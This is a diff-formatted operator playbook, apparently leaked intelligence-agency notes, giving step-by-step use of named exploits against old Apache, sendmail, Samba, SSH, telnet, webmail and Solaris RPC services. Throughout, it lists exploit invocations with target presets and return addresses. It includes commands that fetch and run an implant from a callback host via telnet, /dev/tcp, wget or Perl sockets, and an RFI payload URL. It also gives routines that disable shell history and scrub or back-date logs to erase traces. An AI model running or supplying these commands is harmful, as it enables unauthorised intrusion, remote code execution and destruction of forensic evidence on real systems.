+#      4.1 FreeBSD Apache 1.3.14 / 1.3.17 / 1.3.19 / 1.3.20 / 1.3.22 / 1.3.23 / 1.3.24 (built from source)
+      ./envelopswallow -o f -h TARGET_IP:80 -w 1000 -b 0x080edc29 -d -146 -z 36 -r 6
+
+
+#      4.4 FreeBSD Apache 1.3.20(binary)
+      ./envelopswallow -b 0xbfbf0000 -z 16 -r 11 -d -134 -h TARGET_IP:80
+
+
+#      4.4 FreeBSD ru-apache+mod_ssl-1.3.20+30.5+2.8.4 (distro binary)
+      ./envelopswallow -b 0xbfbfd000 -z 16 -r 11 -d -134 -h TARGET_IP:80
+
+
+#      4.5 FreeBSD apache+mod_ssl-1.3.22+2.8.5_4(distro binary) and apache-1.3.22_7 (distro binary)
+      ./envelopswallow -b 0xbfbfd000 -z 16 -r 11 -d -134 -h TARGET_IP:80
+
+
+### Let it run for about addresses (rows of PppP...ppP's) then bail if it doesn't hit
+### maybe let it run an hour or less
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd
+telnet PITCH_IP NETCAT_PORT < /dev/console | uudecode;ls -la
+uncompress sendmail.Z
+netstat -an | grep RAT_PORT
+D=-lRAT_PORT PATH=. sendmail
+
+### pitch window
+-nstun TARGET_IP RAT_PORT
+
+
+
+upload local: rforkx.freebsd (FreeBSD 4.1 & 4.3)
+        or    sm11x.freeBSD ( ONLY for:
+                        7.0, 7.1, FBSD 4.2
+                        FBSD -t0
+                        7.0 -t1
+                        7.1 -t2
+
+
+
+
+######################################
+#  RFORKX
+######################################
+
+### elevation for x86/FreeBSD
+# Works-on :
+# FreeBSD 3.1-RELEASE (GENERIC) #0: Mon Feb 15 11:08:08 GMT 1999
+# FreeBSD 3.2-RELEASE (GENERIC) #0: Tue May 18 04:05:08 GMT 1999
+# FreeBSD 3.3-RELEASE (GENERIC) #0: Thu Sep 16 23:40:35 GMT 1999
+# FreeBSD 4.0-RELEASE (GENERIC) #0: Mon Mar 20 22:50:22 GMT 2000
+# FreeBSD 4.1-RELEASE (GENERIC) #0: Fri Jul 28 14:30:31 GMT 2000
+# FreeBSD 4.2-RELEASE (GENERIC) #0: Mon Nov 20 13:02:55 GMT 2000
+### fails on some newer versions of FreeBSD
+
+
+### upload executable
+cp rforkx rf
+packrat NETCAT_PORT rf
+
+telnet PITCH_IP NETCAT_PORT < /dev/console | uudecode;ls -la
+uncompress rf
+ls -latr
+chmod 700 rf
+./rf
+# wait 5 sec and maybe control-c
+id
+
+
+# start nopen as root then reconnect
+
+
+######################################
+# SM11X
+######################################
+
+Target platform 1:   Red Hat Linux release 7.0 (Guinness)
+                             ESMTP Sendmail 8.11.0/8.11.0
+    Target platform 2:   Red Hat Linux release 7.1 (Seawolf)
+                             ESMTP Sendmail 8.11.2/8.11.2
+    Target platform 3:   FreeBSD 4.2-RELEASE
+                             ESMTP Sendmail 8.11.1/8.11.1
+Caldera Linux 3.1
+    Conectiva Linux 6.0
+    Conectiva Linux 7.0
+    Immunix Linux 7.0
+    SuSE Linux 7.0
+    SuSE Linux 7.1
+    SuSE Linux 7.2
+"sendmail" daemon with any of the versions...
+
+    8.11
+    8.11.1
+    8.11.2
+    8.11.3
+    8.11.4
+    8.11.5
+    8.12.beta5
+    8.12.beta7
+    8.12.beta10
+    8.12.beta12
+    8.12.beta16
+
+
+What assumptions have been made in the design of this capability?
+    Setuid "root" existence of "/usr/sbin/sendmail" on Red Hat Linux 7.0 and
+    7.1 systems, and "/usr/libexec/sendmail/sendmail" on FreeBSD-4.2 systems.
+
+### LOGGING:
+
+"/var/mail/maillog",
+
+cat /etc/redhat-release
+ls -l /usr/sbin/sendmail
+
+
+./sm11x -t OPTION
+### look for the cksums to match, if they don't, you have 5 secs to control-c
+
+### if you don't control-c, a second 5-sec counter will start; you'll also see the following message:
+
+            Recipient names must be specified
+
+
+###### Cleanup:
+
+/var/log/messages (brute force)
+/var/log/error_log (bus error, segment. fault, server seems busy)
+
+
+
+
+###################################
+# EGGBARON
+###################################
+
+### Linux and FreeBSD systems running Samba 2.2.x (pre 2.2.8a) on x86 architectures.
+
+### If successful, it has samba start a listener on port 45295 and the exploit will attempt
+### 	to connect to it to give you root.  
+### If you're redirecting, you need to set up a tunnel to port 45295 on the target,
+###	then connect to it via netcat.
+### Note, that if you use the same ports on both tunnel ends, eggbaron may think that it
+###	was already successful because of false positives by the tunnel
+### Might need to let it give "failed" messages 20-30 times before it works.
+
+./sambal 
+samba-2.2.x < remote root 
+--------------------------
+Usage: ./sambal [-bBcCdfprsStv] [host]
+
+-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 
+			    3 = OpenBSD 3.2)
+-B <step>       bruteforce steps (default = 300)
+-c <ip address> connectback ip address
+-C <max childs> max childs for scan/bruteforce mode (default = 40)
+-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
+-f              force
+-p <port>       port to attack (default = 139)
+-r <ret>        return address
+-s              scan mode (random)
+-S <network>    scan mode
+-t <type>       presets (0 for a list)
+-v              verbose mode
+
+./sambal -t0
+samba-2.2.x < remote root 
+--------------------------
+01. samba-2.2.x - Debian 3.0                      [0xbffffea2]
+02. samba-2.2.x - Gentoo 1.4.x                    [0xbfffe890]
+03. samba-2.2.x - Mandrake 8.x                    [0xbffff6a0]
+04. samba-2.2.x - Mandrake 9.0                    [0xbfffe638]
+05. samba-2.2.x - Redhat 9.0                      [0xbffff7cc]
+06. samba-2.2.x - Redhat 8.0                      [0xbffff2f0]
+07. samba-2.2.x - Redhat 7.x                      [0xbffff310]
+08. samba-2.2.x - Redhat 6.x                      [0xbffff2f0]
+09. samba-2.2.x - Slackware 9.0                   [0xbffff574]
+10. samba-2.2.x - Slackware 8.x                   [0xbffff574]
+11. samba-2.2.x - SuSE 7.x                        [0xbffffbe6]
+12. samba-2.2.x - SuSE 8.x                        [0xbffff8f8]
+13. samba-2.2.x - FreeBSD 5.0                     [0xbfbff374]
+14. samba-2.2.x - FreeBSD 4.x                     [0xbfbff374]
+15. samba-2.2.x - NetBSD 1.6                      [0xbfbfd5d0]
+16. samba-2.2.x - NetBSD 1.5                      [0xbfbfd520]
+17. samba-2.2.x - OpenBSD 3.2                     [0x00159198]
+18. samba-2.2.8 - OpenBSD 3.2 (package)           [0x001dd258]
+19. samba-2.2.7 - OpenBSD 3.2 (package)           [0x001d9230]
+20. samba-2.2.5 - OpenBSD 3.2 (package)           [0x001d6170]
+21. Crash (All platforms)                         [0xbade5dee]
+
+# EGGBARON may not work the first time using the target number as the -t flag. 
+# Try bruteforcing it using the -b flag. This usually works, and after very few tries. 
+# If this is taking a long time, try setting the bruteforce step size down using -b 100. 
+# Subsequently, the -t flag will work 
+
+
+
+./sambal -b 0 TARGET_IP
+
+####### redirected:
+
+### via pitch:
+-tunnel
+l 1139 TARGET_IP 139
+l 4444 TARGET_IP 45295
+r NETCAT_PORT
+
+### Locally:
+./sambal -p 1139 -b 0 127.0.0.1
+./sambal -f -p 1139 -b 0 127.0.0.1
+
+# skip to nc section
+
+
+### Thru a windows box:
+### 1.  Need a 2 second delay (-d 2000000)
+### 2.  Need three tunnels (exploit, nc to port 45295, and callback to upload RAT)
+
+background redirect -tcp -lplisten 4444 -target 10.1.1.3 45295 -bind WINDOWS_LOCAL
+background redirect -tcp -lplisten 1139 -target 10.1.1.3 139 -bind WINDOWS_LOCAL
+background redirect -tcp -implantlisten 25896 -target LOCAL_UNIX 25896 -nodes 40 
+
+
+### If you think you can't contact the target directly and want the exploit to 
+### call back to you, use the "-c WINDOWS_TARG_CALLBACK" option, and start
+### a windows tunnel and unix netcat listener on port 45295
+### Even if the "-c WINDOWS_TARG_CALLBACK" is used, both a callback to port 45295 _AND_
+### a listener on the target's port 45295 will be created
+
+
+### Locally:
+./sambal -t0
+./sambal -r 0xbffffb00 -b 0 -B 300 -v -c WINDOWS_TARG_CALLBACK -C 1 -f -d 2000000 -p 1139 WIN_LOCAL
+./sambal -r 0xbffffd00 -b 0 -B 300 -v -c WINDOWS_TARG_CALLBACK -C 1 -f -d 2000000 -p 1139 WIN_LOCAL
+
+
+### try connecting via netcat after any "session failed" message when redirecting:
+nc PITCH_IP_or_WINDOWS_LOCAL 4444
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+w
+uname -a
+### start a netcat with the right nopen version (don't need to uuencode with /dev/tcp way)
+###  nc -l -v -p NETCAT_PORT < sendmail
+pwd
+mkdir /tmp/.scsi; cd /tmp/.scsi; pwd
+ls -l /usr/bin/uudecode
+/bin/cat</dev/tcp/WINDOWS_TARG_CALLBACK/NETCAT_PORT>/tmp/.scsi/sendmail
+chmod 700 sendmail
+PATH=. sendmail
+id
+
+### Cleanup
+# look for stray process in netstat (bunch of funky chars followed by /bin/sh on port 45295)
+# then kill the associated process running it:
+netstat -anlp | grep 45295
+ps -ef |grep <PID>
+kill -9 <PID>
+
+
+# Logging depends on OS; usually indicated in smb.conf file or check:
+# /var/log/samba/smb.log, /var/log/samba/<machine-name>.log 
+
+### 
+##################################################
+# EXTRANEOUSMONKEY
+##################################################
+
+-tunnel
+l 443 TARGET_IP
+
+### verify the exploit will work with a test command:
+./em -i 127.0.0.1 -t 2 -u "w; date; date -u; uname -a"
+
+### next, run this one using the proper noclient  & noserver
+### nopen will be started as httpd owned by apache
+### you'll connect in the / directory
+
+./em -i 127.0.0.1 -t 2 -s /current/up/noserver -c /current/bin/noclient
+
+
+-cd /tmp
+-lt
+uname -a
+
+### start another nopen listener on a random port (not reusing the socket)
+
+unset I; PATH=. D=-l38475 .httpd
+
+
+### from redirector
+-nstun TARGET_IP:38475
+
+
+### elevate using your favorite local (probably EVENTSTART), then start
+### another privileged noserver, connect to it, then clean up
+
+
+### Logging:
+/var/log/httpd/ssl_error_log
+/var/log/httpd/access_log
+/var/log/httpd/ssl_access_log
+/var/log/httpd/ssl_request_log
+
+
+
+
+##############################################################################
+### EXPIRETRACHEA
+#############################################################################
+
+# close to freebsd 4.3
+# copy nopen for freebsd 4.3 as noserver in /current/up; automatically uploads and connects
+
+-scan mail TARGET_IP
+
+# returns BorderWare MXtreme Mail Firewall
+
+#cgi-bin/remote/expiretrachea/i586-pc-linux-gnu/opscript.borderware
+#expiretrachea_helper.pl
+#expiretrachea.pl -h hostname -c PITCH_IP
+
+### redirected:
+-tunnel
+l 80 TARGET_IP
+r 25
+
+# 1st window
+expiretrachea_helper.pl -c PITCH_IP
+
+# 2nd window
+expiretrachea.pl -h 127.0.0.1 -c PITCH_IP
+
+# clean logs:
+### /server/ftp/log/httpd:  referer_log, ssl_request_log, and access_log
+#grep -v "-" /server/ftp/log/httpd/referer_log > /tmp/.scsi/c; cat /tmp/.scsi/c > /server/ftp/log/httpd/referer_log
+
+pwd
+-lt /server/ftp/log
+-lt /server/ftp/log/httpd
+-lt /
+df -k
+w
+ps -auxww
+-cd /var/tmp
+
+-get /server/ftp/log/messages
+-tail /server/ftp/log/messages
+grep -v DSADMIN /server/ftp/log/messages > m; cat m > /server/ftp/log/messages
+grep -v PITCH_IP /server/ftp/log/messages > m; cat m > /server/ftp/log/messages
+
+-get /server/ftp/log/httpd/referer_log
+-tail /server/ftp/log/httpd/referer_log
+grep -v prepend /server/ftp/log/httpd/referer_log > m; cat m > /server/ftp/log/httpd/referer_log
+grep -v x90 /server/ftp/log/httpd/referer_log > m; cat m > /server/ftp/log/httpd/referer_log
+grep -v admin /server/ftp/log/httpd/referer_log > m; cat m > /server/ftp/log/httpd/referer_log
+grep -v C /server/ftp/log/httpd/referer_log > m; cat m > /server/ftp/log/httpd/referer_log
+
+-get /server/ftp/log/httpd/access_log
+-tail /server/ftp/log/httpd/access_log
+grep -v PITCH_IP /server/ftp/log/httpd/access_log > m; cat m > /server/ftp/log/httpd/access_log
+
+-get /server/ftp/log/httpd/ssl_request_log
+-tail /server/ftp/log/httpd/ssl_request_log
+grep -v PITCH_IP /server/ftp/log/httpd/ssl_request_log > m; cat m > /server/ftp/log/httpd/ssl_request_log
+
+
+-get /server/ftp/log/httpd/error_log
+-tail /server/ftp/log/httpd/error_log
+grep -v PITCH_IP /server/ftp/log/httpd/error_log > m; cat m > /server/ftp/log/httpd/error_log
+grep -v db_sql /server/ftp/log/httpd/error_log > m; cat m > /server/ftp/log/httpd/error_log
+
+-rm m
+-rm /tmp/.scsi/sendmail /tmp/.scsi/getopt /tmp/.scsi
+-lt
+
+
+###################################################
+###  NFTP
+###################################################
+#  nopen ftp 
+############
+
+ourtn -lue PITCH_IP
+noclient PITCH_IP:PORT
+
+-tunnel 12121 udp       # NOTE: As of v1.1, if this is not there, the
+                                error message will offer it as a pastable.
+
+
+# In the LOCAL window, use nftp to transfer a file in both directions
+# via NOPEN redirection to PITCH_IP in regular mode (-d and -V are
+# optional and give more debugging/verbose information):
+
+nftp -r PITCH_IP -d -V TARGET_IP
+# pnftp -r PITCH_IP -d -V TARGET_IP
+
+user
+password
+ls
+cd /bin
+lcd ../down
+#get vi
+cd /tmp
+#put vi vi.test1
+bye
+
+#######################################
+### ELITEHAMMER 
+#######################################
+### Runs against RedFlag Webmail 4 (software install) 
+### Gives you user nobody,  not root; 
+### Need a local to get root (EVENTSTART or ELASTICBANJO?)
+### Webmail port is usually 80 or 443
+
+-scan http  TARGET_IP
+-scan ssl  TARGET_IP
+-scan 8025  TARGET_IP
+
+### This version will reuse the same port for the nopen upload and the nopen callback:
+
+### Redirector:
+-tunnel
+l WEBPORT TARGET_IP
+r CALL_BACK_PORT
+
+### In two scripted local windows, run the following:
+
+### 1st window
+###./elitehammer_helper.pl -c <callbackip> -p <callbackport> [-n path to noserver <default: ../up/noserver>] [-s sleep secs <default: 5>]
+./elitehammer_helper.pl -c PITCH_IP -p CALL_BACK_PORT
+
+### 2nd window
+###./elitehammer.pl -h <targetip> -m <target's web port> -c <callbackip> -p <callback port> [-l if https]
+./elitehammer.pl -h 127.0.0.1 -m WEBPORT -c PITCH_IP -p CALL_BACK_PORT
+
+
+### Troubleshooting Elitehammer
+### If you throw the exploit and just see the first connection,
+### a firewall might be blocking certain outbound ports
+
+-tunnel
+l 8888 TARGET_IP mailport
+r 53
+r 25
+r 110
+r 80
+r 443
+r 21
+r 22
+r 23
+ 
+### Locally, setup nc for each of the above ports to see what target will allow
+### out (53,25,110,80,443,21,22,23)
+nc -l -p NETCAT_PORT
+ 
+### Then surf the following in a web browser and watch your netcat window for a connection:
+http://127.0.0.1:8888/mod_password.php?cfg_m_function=http://PITCH_IP:NETCAT_PORT
+ 
+### Once you've identified a port allowed out, change the CALL_BACK_PORT in your tunnels and
+### commands aand try again
+
+### Once successful, you'll be connected in a nopen window as user nobody
+
+-lt
+id
+-cd /tmp/.scsi
+-lt
+uname -a
+w
+
+### more windows
+# noclient -l CALL_BACK_PORT
+# PATH=. D=-cPITCH_IP:CALL_BACK_PORT sendmail
+
+### Choose your poison for elevation (EVENTSTART, ELASTICBANJO, others)
+
+###  Clean up 
+	/webmail4/www/logs/access_log
+
+-lt /webmail4/www/logs
+-grep PITCH_IP /webmail4/www/logs/access_log
+grep -v PITCH_IP /webmail4/www/logs/access_log > m; cat m > /webmail4/www/logs/access_log
+touch -t YYMMDDHHMM.ss /webmail4/www/logs/access_log
+-lt /webmail4/www/logs/access_log
+-rm m
+-cd /tmp
+-rm .scsi
+
+#######################################
+### ELASTICBANJO 
+#######################################
+### Elevates to root; make suren redmin is there
+
+-lt /usr/share/redmin/cgi/redmin
+
+### must use /tmp/.scsi directory
+-cd /tmp/.scsi
+-put /current/up/gr.tbz2 gr.tbz2
+tar xvfj gr.tbz2
+-shell
+id
+./gr
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+pwd
+cd /tmp/.scsi
+#PATH=. sendmail
+#noclient -l NOPEN_PORT
+#PATH=. D=-cPITCH_IP:NOPEN_PORT sendmail
+exit
+exit
+
+### Clean up
+	/var/log/rflogview/system_info 
+	/var/log/cron
+	/var/spool/at/.SEQ
+	/tmp/1
+
+-lt /tmp
+-rm /tmp/1
+
+-lt /var/spool
+-lt /var/spool/at
+-cat /var/spool/at/.SEQ
+	# decrement the number in the file by 1
+	#echo 00000 > /var/spool/at/.SEQ
+#echo NUMBER > /var/spool/at/.SEQ
+chown daemon:daemon /var/spool/at/.SEQ
+-cat /var/spool/at/.SEQ
+-lt /var/spool/at
+-touch /var/spool /var/spool/at/.SEQ
+-touch /var/spool /var/spool/at/spool
+-touch /var/spool /var/spool/at
+
+-lt /var/log/cron
+-grep LIST /var/log/cron
+	# all should be from us
+-gs grepout LIST /var/log/cron
+#grep -v LIST /var/log/cron > m; cat m > /var/log/cron
+
+-lt /var/log/rflogview
+-tail /var/log/rflogview/system_info
+-grep LIST /var/log/rflogview/system_info
+-gs grepout LIST /var/log/rflogview/system_info
+# grep -v LIST /var/log/rflogview/system_info > m; cat m > /var/log/rflogview/system_info
+
+-lt / /var/run /var/log
+
+# check history files for root and user you elevated from
+
+-rm m sendmail
+-cd /tmp
+-rm /tmp/.scsi 
+
+##########  Adding/Deleting ipchains rules to scan/exploit internal targets ###
+#  specifically used for jogswirl *.133u, .132u)
+ 
+# on target
+-ifconfig
+ipchains -L -n --line-numbers > L:/current/down/ipchains.lnumbers-orig
+ipchains -L -n --line-numbers 
+
+# locally
+./fw-ipchains -h
+./fw-ipchains -s 172.16.80.19 -d 172.16.0.0/16
+
+# on target
+
+# copy/paste add rules (tcp/udp...) from fw-ipchains output
+# scan/exploit targets
+
+ipchains -L -n --line-numbers 
+
+# copy/paste delete rules (tcp/udp...) from fw-ipchains output
+ipchains -L -n --line-numbers > L:/current/down/ipchains.lnumbers-clean
+ipchains -L -n --line-numbers 
+
+# locally
+cd /current/down
+diff ipchains.lnumbers-orig ipchains.lnumbers-clean
+# make sure -orig and -clean look the same; resetting rules to original state:q
+
+###################################################3
+# KWIKEMART
+###################################################3
+# SSH-1.5-1.2.27
+# SSH-1.5-OpenSSH-1.2.3
+# SSH-1.99-OpenSSH_2.1.1
+# SSH-1.99-OpenSSH_2.2.0
+
+telnet TARGET_IP <sshd port>
+
+./km* -t
+./km -t0
+./km.e -t0
+./km -t2 TARGET_IP 22
+
+
+# CLEAN UP
+
+/var/log/messages
+/var/log/auth
+
+##################################################3
+
+
+
+############################################################
+# SSH
+############################################################
+
+
+
+### get nopen ready to paste with gedit:
+cp noserver sendmail
+compress sendmail
+uuencode sendmail.Z sendmail.Z > sendmail.Z.uu
+gedit sendmail.Z.uu
+
+
+### redirector
+-tunnel
+l 22 TARGET_IP
+
+
+# Multiple targets? If so, wipe your known_hosts file locally between each:
+cat /dev/null > ~/.ssh/known_hosts
+
+ssh -x iga@127.0.0.1 "/bin/sh"
+	# or
+ssh -p RANDOM_PORT -x username@127.0.0.1 /bin/sh
+	# or this eliminates the lack of tty problem
+ssh -p RANDOM_PORT -x username@127.0.0.1
+
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+uname -a
+ls -la /boot
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+which uudecode uncompress
+        # gedit sendmail
+uudecode; ls -la
+
+
+# LINUX:
+# start nopen so you can upload forkpty to be able to su (ptrace didn't work)
+-put forkpty f
+./f
+
+# or:
+su
+
+############## upload nopen:
+
+###
+### using uudecode pastable 
+###
+
+# if no uuencode and no ftshell (if you used telnet) try:
+# locally run:
+uudecode.pastable  /current/up/morerats/noserver-3.0.3.1-i586.pc.linux.gnu.redhat-5.0 sendmail
+
+# paste the perl code that it spits out (hitting return after the last character), then
+# paste sendmail that is brought up in gedit
+
+# you may need to hit Ctl-C after you see the upload complete
+# Note: the upload may not echo to the screen until after the Ctl-C
+
+
+
+
+###
+### using cat & /dev/tcp:
+###
+
+# on redir:
+-tunnel
+r RANDOM
+
+# netcat
+nc -l -v -p RANDOM < sendmail
+
+# on target:
+cat /dev/tcp/PITCH_IP/RANDOM > sendmail
+
+
+
+
+
+###
+### using wget:
+###
+
+# If none of the above work:
+# Locally:
+echo -e 'HTTP/1.0 200\n' > new
+cat new ../up/morerats/noserver-2.6.1-i586.pc.linux.gnu.redhat-5.0 > /current/up/sendmail
+
+nc -l -v -p RANDOM < sendmail
+
+# on redir:
+-tunnel
+r RANDOM
+
+# on target
+wget http://210.56.8.10:RANDOM/sendmail
+ls -la
+chmod 700 sendmail
+PATH=. sendmail
+
+-nstun TARGET_IP 
+
+
+
+###
+### using secure copy
+###
+
+# if that doesn't work, try secure copy:
+
+# on redir:
+-tunnel
+l RANDOM TARGET_IP 22
+
+
+# in a local scripted window:
+cd /current/up
+cp /current/up/noserver crond
+scp -P RANDOM crond username@127.0.0.1:/tmp/.scsi/crond
+# enter passwd at the prompt
+
+
+
+###
+### Want netcat? netcat nc -- how abuot perl instead?
+### using target's perl to open a socket, either
+### callback or listen on target.
+###
+
+my
+:%s/PERLNAME/PERLNAME/g
+:%s/PERLRANDOMPORT/PERLRANDOMPORT/g
+:%s/PERLCALLBACKIP/PERLCALLBACKIP/g
+:%s/PERLCALLFORWARDIP/PERLCALLFORWARDIP/g
+:%s,PERLUPLOADFILE,PERLUPLOADFILE,g
+`y
+
+#### CALLING out from target
+# LOCALLY use netcat to upload file
+nc -vv -l -p PERLRANDOMPORT < PERLUPLOADFILE
+
+# or if you want a loop to keep listening after each upload
+while [ 1 ] ; do \
+  echo starting listen on PERLRANDOMPORT ; \
+  date ; \
+  nc -vv -l -p PERLRANDOMPORT < PERLUPLOADFILE; \
+  echo done ; \
+  sleep 3 ; \
+done
+
+# tunnel
+-tunnel
+r PERLRANDOMPORT
+
+
+# ON TARGET
+perl -MIO -e 'close(STDIN);$c=IO::Socket::INET->new("PERLCALLBACKIP:PERLRANDOMPORT")or exit1;binmode($c);open(O,">PERLNAME")or exit 1;binmode(O);select O;$|=1; print O while (<$c>);close(STDOUT);close($c);unlink("PERLNAME") unless (-s "PERLNAME");'
+
+
+### LISTENING on target
+
+# ON TARGET
+perl -MIO -e '$s=new IO::Socket::INET(LocalPort,PERLRANDOMPORT,Reuse,1,Listen,10) or exit 1; $c=$s->accept() or exit 1;open(O,">PERLNAME")or exit 1;select O;$|=1;print O while <$c>;close(O);close($c);unlink("PERLNAME") unless (-s "PERLNAME");'
+
+# tunnel
+-tunnel
+l PERLRANDOMPORT PERLCALLFORWARDIP
+
+# LOCALLY
+nc -vv 127.0.0.1 PERLRANDOMPORT < PERLUPLOADFILE
+
+
+
+
+
+
+
+
+###
+### to elevate using EVENTSTART(?)  use whatever name you want
+###
+-put /current/up/h h
+
+# in your ssh or telnet masquerade window:
+./h
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+id
+cd /tmp/.scsi;pwd
+chmod 700 sendmail
+chown root:root /tmp/.scsi
+PATH=. sendmail
+
+### in another window
+-nstun TARGET_IP 32755
+
+-rm sendmail
+
+#####  Don't forget to burn the unprivileged nopen
+
+
+
+# Cleanup
+/var/log/secure
+/var/log/messages
+/var/log/lastlog
+/var/log/wtmp
+/var/run/utmp
+
+
+
+
+###########################################################
+# BOSSLAD
+###########################################################
+### when nsrexec is there but NOT with nsrstatd???
+### like a tcp version of BS
+### always uses port 7937
+
+
+### ./bll.tnc.gr 
+
+# Before running this script, you first need to run the following:
+#      nc -l -p localPort < file2Xfer&Run.uu
+#      (nc must be in your path; it's also run w/in this script)
+# where file2Xfer&Run.uu is a compressed, uuencoded file.
+
+
+# Usage: bll.tnc.gr 
+# [options] -- [options to <file2Xfer&Run>]
+#  -i <target ip>               (required)
+#  -l <callback ip>             (required)
+#  -p <callback port>           def = 32177
+#  -f <file2Xfer&Run>           (required)
+#  -D <remoteDir>               def= /tmp/.X11R6
+#
+
+# ./bll.tnc.gr -i 66.128.32.67 -l 67.233.61.230 -p 24792 -f sendmail -D /tmp/.scsi
+
+packrat NETCAT_PORT
+
+### On redirector:
+-tunnel
+l 7937 TARGET_IP
+r NETCAT_PORT
+
+### On local machine:
+### Ex.:  ./bll.tnc.gr -i 127.0.0.1 -l 150.27.1.11 -p 45226 -f sendmail -D /tmp/.scsi
+
+./bll.tnc.gr -i 127.0.0.1 -l PITCH_IP -p NETCAT_PORT -f RAT_NAME -D /tmp/WORK_DIR
+
+
+###  Once upload of RAT completes, connect to target from PI with nopen:
+-nstun TARGET_IP
+
+
+
+
+### Cleanup
+-ls /nsr/cores
+-ls /nsr/cores/sh
+-cat /nsr/cores/sh/*
+rm /nsr/cores/sh/*
+-rm /nsr/cores/sh
+-touch SOMEFILE /nsr/cores
+
+-ls /nsr/logs
+-ls /nsr/logs/daemon.log
+-get /nsr/logs/daemon.log
+wc -l /nsr/logs/daemon.log
+head -## /nsr/logs/daemon.log > n
+-cat n
+cat n > /nsr/logs/daemon.log
+touch SOMEFILE /nsr/logs/daemon.log
+
+
+
+
+#########################################################
+# ELVISCICADA
+#########################################################
+### only up to ealry Sol2.9; Sol2.10 not vulnerable
+
+### snmpXdmid (/usr/lib/dmi/dmispd) daemon program (RPC program 300598 version 1)
+# Req:
+# 1. you must know the OS
+# 2. you must ba able to connect with TCP (for when you get the root shell)
+# 3. /usr/lib/dmi/dmispd must be running on the target system,
+#    and you must be able to successfully talk to its ___UDP___ port.
+#    This is usually evidenced by RPC program 300598 version 1
+#    during rpcinfo -p and UDP rpcinfo -n "touches" of the target, such as...
+#
+#                  $ rpcinfo -p target
+#                      ...
+#                      300598    1   udp  32879
+#                      300598    1   tcp  32796
+#                      ...
+#                  $ rpcinfo -n 32879 -u target 300598
+#                  program 300598 version 1 ready and waiting
+#                  $
+#
+#  if rpcinfo -n returns "ready and waiting", ELVISCICADA should be ready to sing.
+
+### -scan brpc TARGET_IP
+### look for program 300598 version 1 of dmispd and make note of UDP port
+
+### test that TCP connects get thru to the default shellcode port (32387)
+### (being refused is still good - means it went thru)
+### If the port doesn't answer, pick another port that works, AND add the "-s" option
+### using the new (random) port
+
+# ON PI:
+-tunnel
+l 32387 TARGET_IP
+
+# Locally
+telnet 127.0.0.1 32387
+
+
+
+
+### Usage:
+./dw.linux
+
+### Use the lowest number for the target OS and increment by one for subsequent attempts:
+
+./dw.linux -t <VALUE> -i TARGET_IP -s RANDOMSHELLPORT -p UDPPROGRAMPORT
+./dw.linux -t <VALUE> -i TARGET_IP -p UDPPROGRAMPORT
+
+### If redirected:
+
+# On PITCHIMPAIR
+-tunnel
+l RANDOMSHELLPORT TARGET_IP
+u PROGRAMPORT TARGET_IP
+r NETCATPORT
+
+
+# Locally:
+./dw.linux -t <VALUE> -i 127.0.0.1 -s RANDOMSHELLPORT -p UDPPROGRAMPORT -w 10 -b 1024
+./dw.linux -t <VALUE> -i 127.0.0.1 -p UDPPROGRAMPORT
+
+
+
+### Once you have root, get nopen up there:
+
+### on PITCHIMPAIR
+-tunnel
+r NETCAT_PORT
+
+### On target:
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd
+telnet PITCH_IP NETCAT_PORT < /dev/console | uudecode;ls -la
+uncompress sendmail.Z
+netstat -an | grep RAT_PORT
+D=-lRAT_PORT PATH=. sendmail
+netstat -an | grep RAT_PORT
+
+### pitch window
+-nstun TARGET_IP RAT_PORT
+
+
+### Restart both dmispd daemons before leaving the target:
+
+ps -ef |grep dmi
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&-
+rpcinfo -d 300598 1
+/etc/rc3.d/S77dmi stop < /dev/console 2>&1 >/dev/null
+/etc/rc3.d/S77dmi start < /dev/console 2>&1 >/dev/null
+ps -ef |grep dmi
+
+### should see something like this:
+# root   580   399  0 12:48:18 ?        0:00 grep dmi
+# root   577     1  0 12:48:18 ?        0:00 /usr/lib/dmi/snmpXdmid -s target
+# root   573     1  0 12:48:18 ?        0:00 /usr/lib/dmi/dmispd
+
+
+### Cleanup:
+# possible core file in /? or /usr/lib/dmi/dmispd?
+-ls /core /usr/lib/dmi/dmispd
+
+#/var/adm/messages (for failures)
+-tail /var/adm/messages
+
+
+
+#########################################################
+# EMPTYCRISS
+#########################################################
+
+
+###  No redirection:
+
+### This will create the output to paste into the telnet window:
+### local unscripted window:
+
+./emptycriss TARGET_IP
+	# or
+perl ./emptycriss TARGET_IP
+
+
+### op window
+### paste instructions from 1st window into this one
+### Ex.:
+#ATTACKER# telnet 
+#
+#ATTACKER# telnet> environ define TTYPROMPT abcdef 
+#
+#ATTACKER# telnet> o victimip 
+#
+#ATTACKER# telnet> root c c c c c c c c c c c c c c
+#c c c c c c c c c c c c c c c c c c c c c c c c c c
+#c c c c c c c c c c c c c c c c c c c c c c c c\n 
+## 
+##id 
+##uid=0(root) gid=1(other) 
+##uname -a 
+
+### if it fails, try again as /bin
+
+ftshell telnet
+
+
+
+
+### Redirected:
+
+-tunnel
+l RANDOM TARGET_IP 23
+
+#
+# In unscripted window
+#
+./emptycriss 127.0.0.1
+
+
+# In scripted op window:
+
+ftshell telnet 
+
+### NOTE: be sure to open 127.0.0.1 on the RANDOM redirected port
+
+#Ex:
+#o 127.0.0.1 RANDOM
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd 
+~~p
+noserver sendmail
+ls -la
+chmod 700 sendmail
+PATH=. D=-lRAT_PORT sendmail
+
+##########################################
+# EASYSTREET
+##########################################
+### cmsd 100068
+### UDP is best since it's a single packet to exploit
+
+-scan rpc TARGET_IP             # look for 100068 and make note of port
+
+### UDP is best since it's a single packet to exploit
+### with -sploit:
+
+#-sploit will ask you which exploit to try.
+# Select 'CM' (calendar manager)
